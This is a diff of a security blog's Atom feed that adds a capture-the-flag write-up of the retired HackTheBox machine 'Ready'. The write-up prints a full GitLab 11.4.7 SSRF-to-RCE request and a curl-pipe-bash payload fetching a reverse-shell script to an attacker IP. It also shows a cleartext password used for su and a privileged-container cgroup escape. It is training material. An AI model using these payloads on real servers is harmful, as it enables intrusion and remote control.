@@ -1,5 +1,163 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-04-07T19:20:00+02:00</updated><entry><title>HTB: Time</title><link href="https://maggick.fr/2021/04/htb-time.html" rel="alternate"></link><published>2021-04-07T19:20:00+02:00</published><updated>2021-04-07T19:20:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-04-07:/2021/04/htb-time.html</id><summary type="html">&lt;p&gt;&lt;img alt="Time Card" class="align-left" src="/media/2021.04/time_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/all-en.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2021-05-16T09:20:00+02:00</updated><entry><title>HTB: Ready</title><link href="https://maggick.fr/2021/05/htb-ready.html" rel="alternate"></link><published>2021-05-16T09:20:00+02:00</published><updated>2021-05-16T09:20:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-05-16:/2021/05/htb-ready.html</id><summary type="html">&lt;p&gt;&lt;img alt="Ready card" class="align-left" src="/media/2021.05/ready_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/304"&gt;Ready&lt;/a&gt; published on
+December 12 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/27897"&gt;bertolis&lt;/a&gt;
+This box is classified as a medium machine. This box implies an outdated gitlab
+server, a clear text password in a backup file and a docker container.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.05/ready_card.png" alt="Ready card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/304"&gt;Ready&lt;/a&gt; published on
+December 12 2020 by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/27897"&gt;bertolis&lt;/a&gt;
+This box is classified as a medium machine. This box implies an outdated gitlab
+server, a clear text password in a backup file and a docker container.&lt;/p&gt;
+
+
+&lt;h1 id="user"&gt;User&lt;/h1&gt;
+&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
+&lt;p&gt;We start with an nmap scan. Only port 22 (SSH) and port 5080 (HTTP) are open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sun Dec 13 03:40:16 2020 as: nmap -p- -sSV -oN nmap 10.129.29.192&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.129.29.192&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.014s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT     STATE SERVICE VERSION&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
+&lt;span class="code-line"&gt;5080/tcp open  http    nginx&lt;/span&gt;
+&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Sun Dec 13 03:40:48 2020 -- 1 IP address (1 host up) scanned in 31.28 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h2 id="web"&gt;Web&lt;/h2&gt;
+&lt;p&gt;The HTTP service is once again a gitlab (my latest rooted box is laboratory TODO
+link if already published) server. This time the version is 11.4.7. A Google
+research "gitlab 11.4.7 exploit" lead us to a
+&lt;a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/"&gt;blog article about an RCE on gitlab during a CTF&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Following the blog exploitation we end up with a request looking like the
+following and can validate the RCE using a python server on our kalibox.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /projects HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: 10.129.29.192:5080&lt;/span&gt;
+&lt;span class="code-line"&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
+&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
+&lt;span class="code-line"&gt;Referer: http://10.129.29.192:5080/projects/new&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 1073&lt;/span&gt;
+&lt;span class="code-line"&gt;Origin: http://10.129.29.192:5080&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: _gitlab_session=140270c33fe803d8ab11d0f9a85c45cf; sidebar_collapsed=false&lt;/span&gt;
+&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;utf8=%E2%9C%93&amp;amp;authenticity_token=%2BEHyUYosjkfZlzfMEpR8QFZ%2BWiJMAQQ%2BTiB3Wt%2FNK0fNBNX9EhAKd6VM6okCvVQ0fZ6HxSBzQdo%2Fx4Lfe4nDCw%3D%3D&amp;amp;project%5Bimport_url%5D=git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7C%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%31%38%3a%38%30%30%30%2f%72%65%76%32%2e%73%68%20%7c%20%62%61%73%68%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git&amp;amp;project%5Bci_cd_only%5D=false&amp;amp;project%5Bname%5D=&amp;amp;project%5Bnamespace_id%5D=6&amp;amp;project%5Bpath%5D=ttreqqq139&amp;amp;project%5Bdescription%5D=&amp;amp;project%5Bvisibility_level%5D=0&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We can even just manually import a git project using the following "git url":
+&lt;code&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Cxxxxxxxxx%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git&lt;/code&gt; and replacing the payload &lt;code&gt;xxxxxxxxxxx&lt;/code&gt; with our own URL encoded.&lt;/p&gt;
+&lt;p&gt;We send the following payload &lt;code&gt;curl http://10.10.14.18:8000/rev2.sh | bash&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The content of rev2.sh is the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.14.18/4443 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We run a netcat listener to catch our reverse shell. We end up with a shell as
+&lt;code&gt;git&lt;/code&gt; that can read the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ nc -l -p 4443&lt;/span&gt;
+&lt;span class="code-line"&gt;bash: cannot set terminal process group (485): Inappropriate ioctl for device&lt;/span&gt;
+&lt;span class="code-line"&gt;bash: no job control in this shell&lt;/span&gt;
+&lt;span class="code-line"&gt;git@gitlab:~/gitlab-rails/working$ id&lt;/span&gt;
+&lt;span class="code-line"&gt;id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=998(git) gid=998(git) groups=998(git)&lt;/span&gt;
+&lt;span class="code-line"&gt;git@gitlab:/$ find / -name &amp;#39;user.txt&amp;#39; 2&amp;gt;/dev/null&lt;/span&gt;
+&lt;span class="code-line"&gt;find / -name &amp;#39;user.txt&amp;#39; 2&amp;gt;/dev/null&lt;/span&gt;
+&lt;span class="code-line"&gt;/home/dude/user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;git@gitlab:/$ cat /home/dude/user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /home/dude/user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;e1e30b052b6ec0670698805d745e7682&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;h2 id="enumeration"&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;We enumerate a few file and find the &lt;code&gt;/opt/backup/&lt;/code&gt; directory which contain a few
+files. The file &lt;code&gt;gitlab.rb&lt;/code&gt; contain a smtp password.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git@gitlab:/opt/backup$ grep -i pass gitlab.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;grep -i pass gitlab.rb&lt;/span&gt;
+&lt;span class="code-line"&gt;#### Email account password&lt;/span&gt;
+&lt;span class="code-line"&gt;# gitlab_rails[&amp;#39;incoming_email_password&amp;#39;] = &amp;quot;[REDACTED]&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;#     password: &amp;#39;_the_password_of_the_bind_user&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;#     password: &amp;#39;_the_password_of_the_bind_user&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;#   &amp;#39;/users/password&amp;#39;,&lt;/span&gt;
+&lt;span class="code-line"&gt;#### Change the initial default admin password and shared runner registration tokens.&lt;/span&gt;
+&lt;span class="code-line"&gt;# gitlab_rails[&amp;#39;initial_root_password&amp;#39;] = &amp;quot;password&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;# gitlab_rails[&amp;#39;db_password&amp;#39;] = nil&lt;/span&gt;
+&lt;span class="code-line"&gt;# gitlab_rails[&amp;#39;redis_password&amp;#39;] = nil&lt;/span&gt;
+&lt;span class="code-line"&gt;    gitlab_rails[&amp;#39;smtp_password&amp;#39;] = &amp;quot;wW59U!ZKMbG9+*#h&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;# gitlab_shell[&amp;#39;http_settings&amp;#39;] = { user: &amp;#39;username&amp;#39;, password: &amp;#39;password&amp;#39;, ca_file: &amp;#39;/etc/ssl/cert.pem&amp;#39;, ca_path: &amp;#39;/etc/pki/tls/certs&amp;#39;, self_signed_cert: false}&lt;/span&gt;
+&lt;span class="code-line"&gt;##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`&lt;/span&gt;
+&lt;span class="code-line"&gt;# postgresql[&amp;#39;sql_user_password&amp;#39;] = &amp;#39;SQL_USER_PASSWORD_HASH&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;# postgresql[&amp;#39;sql_replication_password&amp;#39;] = &amp;quot;md5 hash of postgresql password&amp;quot; # You can generate with `gitlab-ctl pg-password-md5 &amp;lt;dbuser&amp;gt;`&lt;/span&gt;
+&lt;span class="code-line"&gt;# redis[&amp;#39;password&amp;#39;] = &amp;#39;redis-password-goes-here&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;####! **Master password should have the same value defined in&lt;/span&gt;
+&lt;span class="code-line"&gt;####!   redis[&amp;#39;password&amp;#39;] to enable the instance to transition to/from&lt;/span&gt;
+&lt;span class="code-line"&gt;# redis[&amp;#39;master_password&amp;#39;] = &amp;#39;redis-password-goes-here&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;# geo_secondary[&amp;#39;db_password&amp;#39;] = nil&lt;/span&gt;
+&lt;span class="code-line"&gt;# geo_postgresql[&amp;#39;pgbouncer_user_password&amp;#39;] = nil&lt;/span&gt;
+&lt;span class="code-line"&gt;#     password: PASSWORD&lt;/span&gt;
+&lt;span class="code-line"&gt;###! generate this with `echo -n &amp;#39;$password + $username&amp;#39; | md5sum`&lt;/span&gt;
+&lt;span class="code-line"&gt;# pgbouncer[&amp;#39;auth_query&amp;#39;] = &amp;#39;SELECT username, password FROM public.pg_shadow_lookup($1)&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;#     password: MD5_PASSWORD_HASH&lt;/span&gt;
+&lt;span class="code-line"&gt;# postgresql[&amp;#39;pgbouncer_user_password&amp;#39;] = nil&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We need an interactive shell to be able to input a password, we use python for
+that purpose and end up with a shell as root.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;git@gitlab:~/gitlab-rails/working$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;orking$ python3 -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;git@gitlab:~/gitlab-rails/working$ su&lt;/span&gt;
+&lt;span class="code-line"&gt;su&lt;/span&gt;
+&lt;span class="code-line"&gt;Password: wW59U!ZKMbG9+*#h&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;root@gitlab:/var/opt/gitlab/gitlab-rails/working# id&lt;/span&gt;
+&lt;span class="code-line"&gt;id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Nonetheless we cannot find any &lt;code&gt;root.txt&lt;/code&gt; file. As you probably already guess or
+notice we are in a docker container.&lt;/p&gt;
+&lt;h2 id="docker-escape"&gt;Docker escape&lt;/h2&gt;
+&lt;p&gt;We run &lt;a href="https://github.com/stealthcopter/deepce"&gt;deepce&lt;/a&gt;: Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
+We use a python server on our kalibox to transfer the script using &lt;code&gt;wget --recursive --no-parent http://10.10.14.18:8000&lt;/code&gt;.
+And we run it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[+] Privileged Mode ......... Yes&lt;/span&gt;
+&lt;span class="code-line"&gt;The container appears to be running in privilege mode, we should be able to access the&lt;/span&gt;
+&lt;span class="code-line"&gt;raw disks and mount the hosts root partition in order to gain code execution.&lt;/span&gt;
+&lt;span class="code-line"&gt;See https://stealthcopter.github.io/deepce/guides/docker-privileged.md&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;An other quick Google research allow us to find a &lt;a href="https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1"&gt;medium article&lt;/a&gt;
+to learn more about docker's privilege mode with a few command line to execute a
+command on the system. We just replace the &lt;code&gt;echo "ps aux &amp;gt; $host_path/output" &amp;gt;&amp;gt; /cmd&lt;/code&gt; line
+with &lt;code&gt;echo "cat /root/root.txt &amp;gt; $host_path/output" &amp;gt;&amp;gt; /cmd&lt;/code&gt; and grab the root
+hash.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;root@gitlab:/tmp/.plop# echo &amp;quot;cat /root/root.txt &amp;gt; $host_path/output&amp;quot; &amp;gt;&amp;gt; /cmd&lt;/span&gt;
+&lt;span class="code-line"&gt;echo &amp;quot;cat /root/root.txt &amp;gt; $host_path/output&amp;quot; &amp;gt;&amp;gt; /cmd&lt;/span&gt;
+&lt;span class="code-line"&gt;root@gitlab:/tmp/.plop# sh -c &amp;quot;echo \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;sh -c &amp;quot;echo \$\$ &amp;gt; /tmp/cgrp/x/cgroup.procs&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;root@gitlab:/tmp/.plop# cat /output&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /output&lt;/span&gt;
+&lt;span class="code-line"&gt;b7f98681505cd39066f67147b103c2b3&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;The box is not that hard (less than laboratory [TODO LINK]) and quit interesting
+as the exploitation of the gitlab's SSRF and its upgrade to an RCE was really
+interesting and detailed on the blog article.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="gitlab"></category><category term="docker"></category></entry><entry><title>HTB: Time</title><link href="https://maggick.fr/2021/04/htb-time.html" rel="alternate"></link><published>2021-04-07T19:20:00+02:00</published><updated>2021-04-07T19:20:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-04-07:/2021/04/htb-time.html</id><summary type="html">&lt;p&gt;&lt;img alt="Time Card" class="align-left" src="/media/2021.04/time_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This box is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/286"&gt;Time&lt;/a&gt; publish on
 October 24, 2020 by
@@ -8073,165 +8231,7 @@ the password by hand.
 The second user is just enumeration. It can take a long time before enumerating
 the right folder.
 The root part is quit interesting and let me learn a few things about DLL
-injection.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="DLL"></category><category term="DnsAdmins"></category></entry><entry><title>HTB: Ready</title><link href="https://maggick.fr/2020/05/htb-ready.html" rel="alternate"></link><published>2020-05-16T09:20:00+02:00</published><updated>2020-05-16T09:20:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-05-16:/2020/05/htb-ready.html</id><summary type="html">&lt;p&gt;&lt;img alt="Ready card" class="align-left" src="/media/2021.05/ready_card.png" width="262"/&gt;&lt;/p&gt;
-&lt;p&gt;This is a writeup about a retired HacktheBox machine:
-&lt;a href="https://www.hackthebox.eu/home/machines/profile/304"&gt;Ready&lt;/a&gt; published on
-December 12 2020 by
-&lt;a href="https://www.hackthebox.eu/home/users/profile/27897"&gt;bertolis&lt;/a&gt;
-This box is classified as a medium machine. This box implies an outdated gitlab
-server, a clear text password in a backup file and a docker container.&lt;/p&gt;
-</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.05/ready_card.png" alt="Ready card" width="262"&gt;&lt;/p&gt;
-&lt;p&gt;This is a writeup about a retired HacktheBox machine:
-&lt;a href="https://www.hackthebox.eu/home/machines/profile/304"&gt;Ready&lt;/a&gt; published on
-December 12 2020 by
-&lt;a href="https://www.hackthebox.eu/home/users/profile/27897"&gt;bertolis&lt;/a&gt;
-This box is classified as a medium machine. This box implies an outdated gitlab
-server, a clear text password in a backup file and a docker container.&lt;/p&gt;
-
-
-&lt;h1 id="user"&gt;User&lt;/h1&gt;
-&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
-&lt;p&gt;We start with an nmap scan. Only port 22 (SSH) and port 5080 (HTTP) are open.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sun Dec 13 03:40:16 2020 as: nmap -p- -sSV -oN nmap 10.129.29.192&lt;/span&gt;
-&lt;span class="code-line"&gt;Nmap scan report for 10.129.29.192&lt;/span&gt;
-&lt;span class="code-line"&gt;Host is up (0.014s latency).&lt;/span&gt;
-&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
-&lt;span class="code-line"&gt;PORT     STATE SERVICE VERSION&lt;/span&gt;
-&lt;span class="code-line"&gt;22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
-&lt;span class="code-line"&gt;5080/tcp open  http    nginx&lt;/span&gt;
-&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
-&lt;span class="code-line"&gt;# Nmap done at Sun Dec 13 03:40:48 2020 -- 1 IP address (1 host up) scanned in 31.28 seconds&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;h2 id="web"&gt;Web&lt;/h2&gt;
-&lt;p&gt;The HTTP service is once again a gitlab (my latest rooted box is laboratory TODO
-link if already published) server. This time the version is 11.4.7. A Google
-research "gitlab 11.4.7 exploit" lead us to a
-&lt;a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/"&gt;blog article about an RCE on gitlab during a CTF&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;Following the blog exploitation we end up with a request looking like the
-following and can validate the RCE using a python server on our kalibox.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /projects HTTP/1.1&lt;/span&gt;
-&lt;span class="code-line"&gt;Host: 10.129.29.192:5080&lt;/span&gt;
-&lt;span class="code-line"&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&lt;/span&gt;
-&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
-&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
-&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
-&lt;span class="code-line"&gt;Referer: http://10.129.29.192:5080/projects/new&lt;/span&gt;
-&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
-&lt;span class="code-line"&gt;Content-Length: 1073&lt;/span&gt;
-&lt;span class="code-line"&gt;Origin: http://10.129.29.192:5080&lt;/span&gt;
-&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
-&lt;span class="code-line"&gt;Cookie: _gitlab_session=140270c33fe803d8ab11d0f9a85c45cf; sidebar_collapsed=false&lt;/span&gt;
-&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;utf8=%E2%9C%93&amp;amp;authenticity_token=%2BEHyUYosjkfZlzfMEpR8QFZ%2BWiJMAQQ%2BTiB3Wt%2FNK0fNBNX9EhAKd6VM6okCvVQ0fZ6HxSBzQdo%2Fx4Lfe4nDCw%3D%3D&amp;amp;project%5Bimport_url%5D=git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7C%63%75%72%6c%20%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%31%38%3a%38%30%30%30%2f%72%65%76%32%2e%73%68%20%7c%20%62%61%73%68%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git&amp;amp;project%5Bci_cd_only%5D=false&amp;amp;project%5Bname%5D=&amp;amp;project%5Bnamespace_id%5D=6&amp;amp;project%5Bpath%5D=ttreqqq139&amp;amp;project%5Bdescription%5D=&amp;amp;project%5Bvisibility_level%5D=0&lt;/span&gt;
-&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
-&lt;p&gt;We can even just manually import a git project using the following "git url":
-&lt;code&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Cxxxxxxxxx%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf.git&lt;/code&gt; and replacing the payload &lt;code&gt;xxxxxxxxxxx&lt;/code&gt; with our own URL encoded.&lt;/p&gt;
-&lt;p&gt;We send the following payload &lt;code&gt;curl http://10.10.14.18:8000/rev2.sh | bash&lt;/code&gt;.&lt;/p&gt;
-&lt;p&gt;The content of rev2.sh is the following:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;
-&lt;span class="code-line"&gt;bash -i &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt; /dev/tcp/10.10.14.18/4443 &lt;span class="m"&gt;0&lt;/span&gt;&amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;&lt;/span&gt;
